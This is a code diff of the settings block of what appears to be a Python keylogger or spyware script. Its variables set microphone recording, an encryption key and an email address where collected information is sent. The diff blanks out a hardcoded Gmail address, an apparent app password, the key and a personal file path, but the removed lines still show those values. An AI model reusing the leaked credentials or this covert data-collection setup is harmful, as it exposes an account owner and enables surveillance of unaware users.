@@ -37,16 +37,16 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = "krish9951153592@gmail.com"  # Enter disposable email here
-password = "sdicqmmacrtigcax"  # Enter email password here
+email_address = " "  # Enter disposable email here
+password = " "  # Enter email password here
 
 username = getpass.getuser()
 
-toaddr = "krish9951153592@gmail.com" # Enter the email address you want to send your information to
+toaddr = " " # Enter the email address you want to send your information to
 
-key = "xiLeFd6IR8Ky7eTeiqreO3rI5o1-Adfj6nnXWoYdEYc=" # Generate an encryption key from the Cryptography folder
+key =  " " # Generate an encryption key from the Cryptography folder
 
-file_path = "C:\\Users\krishna\\PycharmProjects\\pythonProject10" # Enter the file path you want your files to be saved to
+file_path = " " # Enter the file path you want your files to be saved to
 extend = "\\"
 file_merge = file_path + extend
 
